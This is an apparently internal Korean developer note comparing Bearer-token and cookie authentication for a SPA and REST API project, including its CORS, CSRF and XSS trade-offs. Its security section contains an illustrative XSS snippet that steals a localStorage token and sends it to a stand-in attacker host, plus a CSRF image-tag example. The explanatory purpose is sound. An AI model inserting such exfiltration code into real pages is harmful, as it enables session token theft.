# Bearer 토큰 vs Cookie 인증 방식

## 질문
> JWT 인증 방식을 Bearer 사용하는 이유가 무엇인가요? 쿠키 방식이 더 간단하지 않나요?

---

## 결론부터 말하면

**둘 다 장단점이 있고, 프로젝트 상황에 따라 선택합니다.**

| 상황 | 추천 방식 |
|------|----------|
| SPA + REST API (우리 프로젝트) | Bearer 토큰 |
| SSR (Next.js, 전통적 웹) | Cookie |
| 모바일 앱 지원 필요 | Bearer 토큰 |
| 다중 도메인/마이크로서비스 | Bearer 토큰 |

---

## 1. 두 방식의 차이

### Bearer 토큰 방식
```
[클라이언트]                              [서버]
    │                                        │
    │ ──── POST /login ──────────────────▶  │
    │                                        │
    │ ◀─── { accessToken: "xxx" } ───────── │
    │                                        │
    │  localStorage에 저장                   │
    │                                        │
    │ ──── GET /api/data ────────────────▶  │
    │      Authorization: Bearer xxx         │
    │                                        │
```

### Cookie 방식
```
[클라이언트]                              [서버]
    │                                        │
    │ ──── POST /login ──────────────────▶  │
    │                                        │
    │ ◀─── Set-Cookie: token=xxx ────────── │
    │                                        │
    │  브라우저가 자동 저장                  │
    │                                        │
    │ ──── GET /api/data ────────────────▶  │
    │      Cookie: token=xxx (자동 첨부)     │
    │                                        │
```

---

## 2. Cookie가 "더 간단해 보이는" 이유

### Cookie의 편리한 점
```javascript
// Cookie 방식: 프론트엔드에서 할 일 거의 없음
fetch('/api/data');  // 끝! 쿠키 자동 첨부

// Bearer 방식: 매번 헤더에 토큰 추가 필요
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**그런데 왜 Bearer를 선택할까요?**

---

## 3. Bearer 토큰을 선택하는 이유

### 이유 1: CORS 문제 없음

```
[문제 상황]
프론트엔드: https://app.example.com
백엔드 API: https://api.example.com
```

```javascript
// Cookie 방식의 CORS 문제
// 다른 도메인 간 쿠키 전송은 복잡한 설정 필요

// 서버 설정 필요:
Access-Control-Allow-Origin: https://app.example.com  // '*' 불가!
Access-Control-Allow-Credentials: true

// 클라이언트 설정 필요:
fetch(url, { credentials: 'include' });

// 브라우저 정책 (SameSite) 때문에 막힐 수도 있음
```

```javascript
// Bearer 방식: CORS 설정 간단
// 그냥 Authorization 헤더만 허용하면 됨
Access-Control-Allow-Headers: Authorization
```

### 이유 2: 모바일 앱 지원

```
[웹 브라우저]
✅ Cookie 작동
✅ Bearer 작동

[모바일 앱 (React Native, Flutter)]
❌ Cookie 복잡 (WebView 아니면 쿠키 관리 어려움)
✅ Bearer 간단 (그냥 헤더에 토큰 넣으면 됨)

[데스크톱 앱 (Electron)]
❌ Cookie 복잡
✅ Bearer 간단
```

우리 프로젝트가 나중에 모바일 앱을 만든다면?
→ Bearer 방식이면 API 그대로 사용 가능!

### 이유 3: 마이크로서비스 아키텍처

```
[Cookie 방식]
           ┌─────────────┐
           │  Gateway    │ ← 쿠키 여기서만 처리
           └──────┬──────┘
                  │
    ┌─────────────┼─────────────┐
    │             │             │
┌───▼───┐   ┌────▼────┐   ┌────▼────┐
│User   │   │Interview│   │Payment  │
│Service│   │Service  │   │Service  │
└───────┘   └─────────┘   └─────────┘
각 서비스에서 쿠키 검증 복잡...

[Bearer 방식]
각 서비스가 독립적으로 JWT 검증 가능!
JWT는 자체적으로 정보를 담고 있음 (Self-contained)
```

### 이유 4: Stateless (무상태) 서버

```
[Cookie + 세션 방식]
서버 메모리에 세션 저장 필요
→ 서버 확장 시 세션 공유 문제 (Redis 등 필요)

[Bearer + JWT 방식]
서버에 아무것도 저장 안 함
토큰 자체에 정보가 있음 (userId, role 등)
→ 서버 확장 용이
```

### 이유 5: CSRF 공격 면역

```
[CSRF 공격이란?]
해커 사이트에서 사용자 모르게 요청을 보내는 공격

<img src="https://bank.com/transfer?to=hacker&amount=1000000">
→ 브라우저가 쿠키 자동 첨부!
→ 돈이 이체됨 💀

[Cookie 방식]
CSRF 토큰 등 추가 방어 필요

[Bearer 방식]
JavaScript가 명시적으로 헤더에 추가해야 함
→ 다른 사이트에서는 우리 localStorage 접근 불가
→ CSRF 공격 불가능!
```

---

## 4. 각 방식의 보안 취약점

### Bearer 토큰 (localStorage)
```
⚠️ XSS 공격에 취약
악성 스크립트가 localStorage 접근 가능

<script>
  // 해커의 악성 코드
  const token = localStorage.getItem('accessToken');
  fetch('https://hacker.com/steal?token=' + token);
</script>

🛡️ 방어: XSS 방지 철저히 (입력값 검증, CSP 헤더)
```

### Cookie (httpOnly)
```
⚠️ CSRF 공격에 취약
다른 사이트에서 요청 시 쿠키 자동 첨부

🛡️ 방어: CSRF 토큰, SameSite 속성
```

### 보안 비교표

| 공격 유형 | Bearer (localStorage) | Cookie (httpOnly) |
|----------|----------------------|-------------------|
| XSS | ⚠️ 취약 | ✅ 안전 |
| CSRF | ✅ 안전 | ⚠️ 취약 |

**결론**: 어떤 방식이든 보안 고려 필요

---

## 5. 우리 프로젝트에서 Bearer를 선택한 이유

```
1. SPA (React) + REST API 구조
   → Bearer 방식이 표준적인 패턴

2. 나중에 모바일 앱 확장 가능성
   → Bearer면 API 재사용 가능

3. Swagger UI 테스트 편의성
   → Bearer 토큰 입력이 더 간단

4. 프론트/백 도메인 분리 (개발 환경)
   → localhost:5173 (프론트) ↔ localhost:8080 (백)
   → CORS 설정 간단

5. JWT의 장점 활용
   → 토큰 자체에 사용자 정보 포함
   → 서버 세션 저장 불필요
```

---

## 6. 하이브리드 방식도 있다!

실제로 두 방식을 조합하는 경우도 많습니다:

```
[Access Token]  → Bearer 헤더 (짧은 만료시간)
[Refresh Token] → httpOnly Cookie (긴 만료시간)
```

### 장점
- Access Token: XSS로 탈취돼도 금방 만료
- Refresh Token: httpOnly라 XSS로 접근 불가

### 우리 프로젝트 현재 구조
```typescript
// frontend/src/api/client.ts
localStorage.setItem('accessToken', accessToken);   // Bearer
localStorage.setItem('refreshToken', refreshToken); // 이것도 localStorage

// 더 안전하게 하려면 Refresh Token은 httpOnly Cookie로 변경 가능
```

---

## 7. 정리

| 기준 | Bearer 토큰 | Cookie |
|------|------------|--------|
| 구현 난이도 | 프론트 약간 복잡 | 프론트 간단 |
| CORS | 간단 | 복잡 |
| 모바일 앱 | 쉬움 | 어려움 |
| 마이크로서비스 | 적합 | 부적합 |
| XSS 방어 | 취약 (별도 방어 필요) | httpOnly로 안전 |
| CSRF 방어 | 기본 안전 | 별도 방어 필요 |
| Stateless | 완전 무상태 | 세션 필요할 수 있음 |

### 우리 프로젝트 선택: Bearer 토큰

**이유**: SPA + REST API + 확장성 + 업계 표준

---

## 관련 파일
- `frontend/src/api/client.ts` - Bearer 토큰 처리
- `backend/.../SwaggerConfig.java` - Bearer 인증 설정
- `backend/.../SecurityConfig.java` - Spring Security 설정 (Phase 2에서 구현)
